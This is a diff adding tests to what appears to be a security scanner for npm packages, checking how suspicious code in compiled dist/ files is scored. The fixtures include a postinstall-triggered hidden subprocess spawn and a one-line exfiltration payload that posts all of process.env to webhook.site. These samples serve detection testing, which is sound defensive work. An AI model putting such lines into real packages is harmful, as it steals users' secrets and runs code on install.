@@ -530,6 +530,54 @@ test("F3 payload in test/ NOT reachable from main still downgrades to review", (
   assert.equal(cred.severity, "medium");
 });
 
+// --- #F3b compiled build output (dist/build) is scanned but downgraded -------
+// We now scan dist/ and build/ (a published tarball's real code often lives ONLY
+// there), but a behavioral HIGH in a compiled bundle is unreliable: bundlers
+// concatenate unrelated modules, and legit build tools (rollup/vite/webpack)
+// spawn subprocesses in their own dist. So a behavioral HIGH in a dist file that
+// is merely reachable from `main` is surfaced as REVIEW — but one an install
+// hook actually executes stays HIGH.
+
+test("F3b behavioral HIGH in dist/ reachable from main is downgraded to review", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ main: "dist/native.js" }),
+      // rollup-shaped native-binding probe: hidden `node -p` subprocess spawn.
+      "dist/native.js":
+        "const s='probe';const c=require('child_process').spawnSync(process.execPath,['-p',s],{windowsHide:true,stdio:'ignore'});module.exports=c;"
+    }
+  });
+  assert.equal(report.verdict, "review");
+  assert.equal(findingFor(report, "code-execution").severity, "medium");
+});
+
+test("F3b the SAME dist file executed by a postinstall hook stays HIGH (blocks)", () => {
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": cleanPkg({ scripts: { postinstall: "node dist/native.js" } }),
+      "dist/native.js":
+        "const s='probe';const c=require('child_process').spawnSync(process.execPath,['-p',s],{windowsHide:true,stdio:'ignore'});module.exports=c;"
+    }
+  });
+  assert.equal(report.verdict, "block");
+  assert.equal(findingFor(report, "code-execution").severity, "high");
+});
+
+test("F3b env-harvest exfil in a dist bundle downgrades, but the same shape in hand-written src still blocks", () => {
+  const exfil =
+    "const e=process.env;fetch('https://webhook.site/x',{method:'POST',body:JSON.stringify(e)});";
+  const inDist = auditEvidence({
+    sourceFiles: { "package.json": cleanPkg({ main: "dist/index.js" }), "dist/index.js": exfil }
+  });
+  assert.equal(inDist.verdict, "review");
+
+  const inSrc = auditEvidence({
+    sourceFiles: { "package.json": cleanPkg({ main: "lib/index.js" }), "lib/index.js": exfil }
+  });
+  assert.equal(inSrc.verdict, "block");
+  assert.equal(findingFor(inSrc, "network-exfil-or-loader").severity, "high");
+});
+
 // --- #F4 IP-encoding evasion ------------------------------------------------
 // findPublicIpInCode used to match only dotted-quad IPv4, so decimal-dword,
 // hex-dword, and bracketed-IPv6 URL hosts evaded the hardcoded-IP HIGH. Private
